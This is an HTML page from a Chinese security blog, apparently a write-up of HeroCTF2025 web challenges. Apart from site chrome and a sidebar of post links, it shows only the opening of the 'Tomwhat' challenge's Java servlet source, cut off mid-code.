@@ -1,0 +1,668 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>HeroCTF2025 | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"ta0.fun","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="ta0的小站" type="application/atom+xml"><meta name="description" content="最近空闲期，无聊就打打CTF，睡睡觉。 WEBTomwhatpackage com.example.light;  import java.io.IOException; import jakarta.servlet.ServletException; import jakarta.servlet.http.*;  public class LightServlet extends HttpSer">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HeroCTF2025">
+<meta property="og:url" content="http://ta0.fun/posts/17991232/index.html">
+<meta property="og:site_name" content="ta0的小站">
+<meta property="og:description" content="最近空闲期，无聊就打打CTF，睡睡觉。 WEBTomwhatpackage com.example.light;  import java.io.IOException; import jakarta.servlet.ServletException; import jakarta.servlet.http.*;  public class LightServlet extends HttpSer">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251129204056.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251129220823.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251129220816.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251129223629.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251129232241.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251129232329.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251201153713.png">
+<meta property="article:published_time" content="2025-12-14T13:29:54.971Z">
+<meta property="article:modified_time" content="2025-12-14T13:42:18.587Z">
+<meta property="article:author" content="ta0">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251129204056.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container sidebar-open"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">157</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">16</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">221</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr class="sidebar-hr" style="margin:0.5rem 0 0.5rem 0;"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><!-- 友链按钮并排放在社交区--><a class="links-of-author-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a><!-- 黑暗模式按钮也并排--><a class="links-of-author-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomwhat"><span class="toc-number">1.1.</span> <span class="toc-text">Tomwhat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Revoked"><span class="toc-number">1.2.</span> <span class="toc-text">Revoked</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Revoked-Revenge"><span class="toc-number">1.3.</span> <span class="toc-text">Revoked Revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SAMLevinson"><span class="toc-number">1.4.</span> <span class="toc-text">SAMLevinson</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spring-Drive"><span class="toc-number">1.5.</span> <span class="toc-text">Spring Drive</span></a></li></ol></li></ol></div></div></div><!-- 侧边栏底部空白区域展示目录--><!-- 分类目录区域，所有分类默认收缩--><hr class="sidebar-hr" style="margin:0.5rem 0 0.5rem 0;"><div class="sidebar-bottom-categories" style="margin-top:0.5rem;padding:1rem 0;"><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">CTFWP</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/b891edcc/">2023aliyunCTF-Bypassit1</a></li><li class="sidebar-cat-post"><a href="/posts/4b74e7f2/">2023WMCTF ez_java_again_rev</a></li><li class="sidebar-cat-post"><a href="/posts/125ab785/">2023羊城杯Ez_java</a></li><li class="sidebar-cat-post"><a href="/posts/996ba1d8/">2023巅峰极客BabyURL</a></li><li class="sidebar-cat-post"><a href="/posts/c292ee15/">BaseCTF-scxml</a></li><li class="sidebar-cat-post"><a href="/posts/7d623870/">GYCTF2020-Easyphp</a></li><li class="sidebar-cat-post"><a href="/posts/9d1ed1c9/">LitCTF2024个人题解</a></li><li class="sidebar-cat-post"><a href="/posts/bd91e42f/">LitCTF2024未解题复现</a></li><li class="sidebar-cat-post"><a href="/posts/91008f23/">VNCTF2025复现</a></li><li class="sidebar-cat-post"><a href="/posts/545cd3ac/">XYCTF个人wp</a></li><li class="sidebar-cat-post"><a href="/posts/7345579c/">XYCTF未解题复现</a></li><li class="sidebar-cat-post"><a href="/posts/2f532906/">网鼎杯2020玄武组SSRFMe</a></li><li class="sidebar-cat-post"><a href="/posts/4cfd8fa8/">DownunderCTf复现</a></li><li class="sidebar-cat-post"><a href="/posts/43176253/">国城杯web复现</a></li><li class="sidebar-cat-post"><a href="/posts/4666d2e/">帕鲁杯my love复现</a></li><li class="sidebar-cat-post"><a href="/posts/92fba657/">某不知名CTF比赛</a></li><li class="sidebar-cat-post"><a href="/posts/fa26c9c2/">DASCTF2025下半年赛</a></li><li class="sidebar-cat-post"><a href="/posts/57b83d00/">nexhuntCTF</a></li><li class="sidebar-cat-post"><a href="/posts/17991232/">HeroCTF2025</a></li><li class="sidebar-cat-post"><a href="/posts/d34a19fb/">老乡鸡CTF</a></li><li class="sidebar-cat-post"><a href="/posts/23ac0af4/">IS2025</a></li><li class="sidebar-cat-post"><a href="/posts/7ca5dbd/">NiteCTF2025</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">AD</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/2d21762d/">Kerberos协议</a></li><li class="sidebar-cat-post"><a href="/posts/b774aeb/">NTLM协议</a></li><li class="sidebar-cat-post"><a href="/posts/3e4e3078/">LDAP协议</a></li><li class="sidebar-cat-post"><a href="/posts/636860d3/">AD攻击</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">应急取证</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/22f8a4f5/">2024网鼎杯半决赛安全运营挑战赛</a></li><li class="sidebar-cat-post"><a href="/posts/cc783675/">第一章-应急响应-Linux日志分析</a></li><li class="sidebar-cat-post"><a href="/posts/c8f379ac/">第二章-应急响应-apache日志分析</a></li><li class="sidebar-cat-post"><a href="/posts/9c3ca66c/">webshell查杀</a></li><li class="sidebar-cat-post"><a href="/posts/e0ad1852/">应急响应靶场(1)</a></li><li class="sidebar-cat-post"><a href="/posts/a04aefa7/">应急加固-医院脱库应急处理</a></li><li class="sidebar-cat-post"><a href="/posts/efc85f7f/">应急靶场-Linux入侵排查</a></li><li class="sidebar-cat-post"><a href="/posts/4844d267/">应急靶场-redis应急</a></li><li class="sidebar-cat-post"><a href="/posts/42c3bb70/">日志分析-IIS日志分析</a></li><li class="sidebar-cat-post"><a href="/posts/beb16a0d/">应急靶场-mysql应急</a></li><li class="sidebar-cat-post"><a href="/posts/28af606d/">第二届帕鲁杯应急响应wp</a></li><li class="sidebar-cat-post"><a href="/posts/f79382a3/">第一届&quot;帕鲁杯&quot;wp</a></li><li class="sidebar-cat-post"><a href="/posts/83be2f6e/">第九章-blueteam 的小心思</a></li><li class="sidebar-cat-post"><a href="/posts/bd7d5e3d/">第二届长城杯&amp;CISCN半决赛-应急响应</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">cyberstrikelab</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/3c15bfe8/">ATT&amp;CK实战框架-lab9</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">流量分析</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/864938c/">CobaltStrike流量分析</a></li><li class="sidebar-cat-post"><a href="/posts/a70a62d9/">CobaltStrike4.0流量分析</a></li><li class="sidebar-cat-post"><a href="/posts/ae37354d/">哥斯拉ekp版本流量分析</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">WEB安全</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/5b4d21b4/">DOM Clobbering</a></li><li class="sidebar-cat-post"><a href="/posts/1bb25fe1/">JAVA常见内存马</a></li><li class="sidebar-cat-post"><a href="/posts/31287ede/">Langflow权限提升漏洞</a></li><li class="sidebar-cat-post"><a href="/posts/7705fe97/">JDK17下的CC链分析</a></li><li class="sidebar-cat-post"><a href="/posts/b88a52de/">Spring jdk17原生链</a></li><li class="sidebar-cat-post"><a href="/posts/f02bb322/">用友U8 Cloud IPFxxFileService 文件上传限制不当漏洞</a></li><li class="sidebar-cat-post"><a href="/posts/57292570/">用友U8 Cloud FileManageServlet/LoginVideoServlet反序列化</a></li><li class="sidebar-cat-post"><a href="/posts/323bf891/">用友U8 Cloud NCCloudGatewayServlet接口 命令执行漏洞</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">HackMyVM-Labs</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/45ea257e/">lab-Temperance</a></li><li class="sidebar-cat-post"><a href="/posts/13a562a7/">HackMyVM-Hades</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">HackMyVM</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/a88f73eb/">HackMyVM-Airbind</a></li><li class="sidebar-cat-post"><a href="/posts/b1859e86/">HackMyVM-BaseME</a></li><li class="sidebar-cat-post"><a href="/posts/724f9cb4/">HackMyVM-Apaches</a></li><li class="sidebar-cat-post"><a href="/posts/2e3aa93f/">HackMyVM-Canto</a></li><li class="sidebar-cat-post"><a href="/posts/16d10af0/">HackMyVM-Casino</a></li><li class="sidebar-cat-post"><a href="/posts/65d8e1a1/">HackMyVM-Birthday</a></li><li class="sidebar-cat-post"><a href="/posts/3e3f7c7d/">HackMyVM-CodeShield</a></li><li class="sidebar-cat-post"><a href="/posts/151f8aa9/">HackMyVM-Comet</a></li><li class="sidebar-cat-post"><a href="/posts/61f88fc9/">HackMyVM-Convert</a></li><li class="sidebar-cat-post"><a href="/posts/9c57f07c/">HackMyVM-DC02</a></li><li class="sidebar-cat-post"><a href="/posts/201f4a94/">HackMyVM-Friendly</a></li><li class="sidebar-cat-post"><a href="/posts/55ea1c6/">HackMyVM-DC01</a></li><li class="sidebar-cat-post"><a href="/posts/b99628b9/">HackMyVM-Dentacare</a></li><li class="sidebar-cat-post"><a href="/posts/13e2841d/">HackMyVM-Inkplot</a></li><li class="sidebar-cat-post"><a href="/posts/65c2fc62/">HackMyVM-Lookup</a></li><li class="sidebar-cat-post"><a href="/posts/3d6a4d0/">HackMyVM-Logan</a></li><li class="sidebar-cat-post"><a href="/posts/b9453620/">HackMyVM-Liar</a></li><li class="sidebar-cat-post"><a href="/posts/4dfb16e2/">HackMyVM-Echoed</a></li><li class="sidebar-cat-post"><a href="/posts/a8d85fe0/">HackMyVM-Nightfall</a></li><li class="sidebar-cat-post"><a href="/posts/dee12de6/">HackMyVM-NightCity</a></li><li class="sidebar-cat-post"><a href="/posts/85f65919/">HackMyVM-Principle</a></li><li class="sidebar-cat-post"><a href="/posts/ed97f61a/">HackMyVM-Friendly2</a></li><li class="sidebar-cat-post"><a href="/posts/1c8b7cf7/">HackMyVM-Puiblishe</a></li><li class="sidebar-cat-post"><a href="/posts/709c1b3d/">HackMyVM-Hell</a></li><li class="sidebar-cat-post"><a href="/posts/8349b408/">HackMyVM-Satori</a></li><li class="sidebar-cat-post"><a href="/posts/54a57065/">HackMyVM-Simple</a></li><li class="sidebar-cat-post"><a href="/posts/b9be1174/">HackMyVM-Observer</a></li><li class="sidebar-cat-post"><a href="/posts/601a25e4/">HackMyVM-Stars</a></li><li class="sidebar-cat-post"><a href="/posts/75345549/">HackMyVM-DC04</a></li><li class="sidebar-cat-post"><a href="/posts/1cc64d1/">HackMyVM-bounty</a></li><li class="sidebar-cat-post"><a href="/posts/3ca28c17/">HackMyVM-Tiny</a></li><li class="sidebar-cat-post"><a href="/posts/6c34648c/">HackMyVM-Za_1</a></li><li class="sidebar-cat-post"><a href="/posts/637ff6f0/">HackMyVM-TriplAdvisor</a></li><li class="sidebar-cat-post"><a href="/posts/e117db9f/">HackMyVM-University</a></li><li class="sidebar-cat-post"><a href="/posts/a4e579f8/">HackMyVM-crack</a></li><li class="sidebar-cat-post"><a href="/posts/7387f134/">HackMyVM-Aurora</a></li><li class="sidebar-cat-post"><a href="/posts/a583b130/">HackMyVM-dejavu</a></li><li class="sidebar-cat-post"><a href="/posts/50cc8bce/">HackMyVM-colors</a></li><li class="sidebar-cat-post"><a href="/posts/99a1cbb9/">HackMyVM-Chronos</a></li><li class="sidebar-cat-post"><a href="/posts/eb50c0ea/">HackMyVM-DC03</a></li><li class="sidebar-cat-post"><a href="/posts/48bf01e2/">HackMyVM-djinn</a></li><li class="sidebar-cat-post"><a href="/posts/6b328076/">HackMyVM-eyes</a></li><li class="sidebar-cat-post"><a href="/posts/f5427d41/">HackMyVM-hundred</a></li><li class="sidebar-cat-post"><a href="/posts/1861442f/">HackMyVM-friendly3</a></li><li class="sidebar-cat-post"><a href="/posts/3d50af75/">HackMyVM-Leet</a></li><li class="sidebar-cat-post"><a href="/posts/8a0eae7/">HackMyVM-oliva</a></li><li class="sidebar-cat-post"><a href="/posts/794033c8/">HackMyVM-tranquil</a></li><li class="sidebar-cat-post"><a href="/posts/42ff075e/">HackMyVM-Literal</a></li><li class="sidebar-cat-post"><a href="/posts/3e9b59e6/">HackMyVM-Kitty</a></li><li class="sidebar-cat-post"><a href="/posts/5e0f535b/">HackMyVM-Printer</a></li><li class="sidebar-cat-post"><a href="/posts/2c430ca5/">HackMyVM-troya</a></li><li class="sidebar-cat-post"><a href="/posts/28f0aa43/">HackMyVM-thwall</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">MAZESEC</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/d2450660/">MazeSec-ta0</a></li><li class="sidebar-cat-post"><a href="/posts/b298e578/">MazeSec-Bicker</a></li><li class="sidebar-cat-post"><a href="/posts/2fc2226d/">MAZESEC-chain</a></li><li class="sidebar-cat-post"><a href="/posts/75928fc0/">MAZESEC-Delete</a></li><li class="sidebar-cat-post"><a href="/posts/10540780/">MAZESEC-Ronos</a></li><li class="sidebar-cat-post"><a href="/posts/78989591/">MazeSec-motto</a></li><li class="sidebar-cat-post"><a href="/posts/fbd08121/">MazeSec-Novice</a></li><li class="sidebar-cat-post"><a href="/posts/24db92f0/">MazeSec-DevOoos</a></li><li class="sidebar-cat-post"><a href="/posts/47da5ee2/">MazeSec-ajpsrv</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">OverTheWire</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/dafc866f/">OverTheWire-Bandit</a></li><li class="sidebar-cat-post"><a href="/posts/c70009a1/">OverTheWire-Natas</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">thehackerlabs</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/92742d47/">thehackerslabs-BLACKGOD</a></li><li class="sidebar-cat-post"><a href="/posts/93aa912/">thehackerslabs-Curiosity</a></li><li class="sidebar-cat-post"><a href="/posts/9e62c57a/">thehackerslabs-Curiosity3</a></li><li class="sidebar-cat-post"><a href="/posts/d94b1923/">thehackerslabs-Mentallity</a></li><li class="sidebar-cat-post"><a href="/posts/3b1290b8/">thehackerslabs-La Casa Del Jamón</a></li><li class="sidebar-cat-post"><a href="/posts/d94efc54/">thehackerslabs-Pildoritas</a></li><li class="sidebar-cat-post"><a href="/posts/273d8e90/">thehackerslabs-elcandidato</a></li><li class="sidebar-cat-post"><a href="/posts/19aecb8c/">thehackerslabs-Paella</a></li><li class="sidebar-cat-post"><a href="/posts/c36651be/">thehackerslabs-Pacharan</a></li><li class="sidebar-cat-post"><a href="/posts/2e40fc49/">thehackerslabs-Chimichurri</a></li><li class="sidebar-cat-post"><a href="/posts/e965f5ec/">thehackerslabs-Curiosity2</a></li><li class="sidebar-cat-post"><a href="/posts/8df01d3/">thehackerslabs-Big</a></li><li class="sidebar-cat-post"><a href="/posts/e23e0315/">thehackerslabs-Offensive</a></li><li class="sidebar-cat-post"><a href="/posts/a8a9f8e9/">thehackerslabs-Doraemon</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">CVE复现</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/dcc68ae8/">Thinkphp3.2.x命令执行</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">Vulnyx</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/1a843bca/">Vulnyx-Anon</a></li><li class="sidebar-cat-post"><a href="/posts/c9c80648/">Vulnyx-Eternal</a></li><li class="sidebar-cat-post"><a href="/posts/20dbae8a/">Vulnyx-Admin</a></li><li class="sidebar-cat-post"><a href="/posts/3a160b8e/">Vulnyx-Experience</a></li><li class="sidebar-cat-post"><a href="/posts/66723be2/">Vulnyx-tunnel</a></li><li class="sidebar-cat-post"><a href="/posts/b53d3c5e/">Vulnyx-send</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">Web安全</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/e9731bcd/">Weblogic漏洞</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">渗透</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/ca796a/">域控-Offensive</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">春秋云境</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/b6e8119b/">春秋云境-Brute4Road</a></li><li class="sidebar-cat-post"><a href="/posts/3a283e32/">春秋云境-Certify</a></li><li class="sidebar-cat-post"><a href="/posts/93b35a6e/">春秋云境-Delegation</a></li><li class="sidebar-cat-post"><a href="/posts/f85c7fea/">春秋云境-Flarum</a></li><li class="sidebar-cat-post"><a href="/posts/952d1a58/">春秋云境-Exchange</a></li><li class="sidebar-cat-post"><a href="/posts/f8a60ebc/">春秋云境-GreatWall</a></li><li class="sidebar-cat-post"><a href="/posts/7ea084a1/">春秋云境-Spoofing</a></li><li class="sidebar-cat-post"><a href="/posts/a5238ac2/">春秋云境-ThermalPower</a></li><li class="sidebar-cat-post"><a href="/posts/cb0f9c73/">春秋云境-Privilege</a></li><li class="sidebar-cat-post"><a href="/posts/9aa9ec9/">春秋云境-Time</a></li><li class="sidebar-cat-post"><a href="/posts/beaf5221/">春秋云境-TunnelX</a></li><li class="sidebar-cat-post"><a href="/posts/3731c1f5/">春秋云境-无间计划</a></li><li class="sidebar-cat-post"><a href="/posts/a0288562/">春秋云境-Tsclient</a></li><li class="sidebar-cat-post"><a href="/posts/aa8a0593/">春秋云境-CloudNet</a></li><li class="sidebar-cat-post"><a href="/posts/327fc326/">春秋云境-Initial</a></li><li class="sidebar-cat-post"><a href="/posts/a3698f4a/">春秋云境-Delivery</a></li><li class="sidebar-cat-post"><a href="/posts/d66aab01/">春秋云境-Hospital</a></li></ul></details></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://ta0.fun/posts/17991232/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">HeroCTF2025</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-12-14 21:29:54" itemprop="dateCreated datePublished" datetime="2025-12-14T21:29:54+08:00">2025-12-14</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">3.6k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">19m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/CTFWP/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">CTFWP</span></a></span></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p>最近空闲期，无聊就打打CTF，睡睡觉。</p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Tomwhat"><a href="#Tomwhat" class="headerlink" title="Tomwhat"></a>Tomwhat</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>light</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">jakarta<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">jakarta<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LightServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span>
+            <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
+
+        resp<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"text/html;charset=UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">HttpSession</span> session <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">String</span> username <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> session<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">String</span> error <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> req<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">StringBuilder</span> html <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        html<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;html>&lt;body>&lt;h1>Light Side&lt;/h1>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>error <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
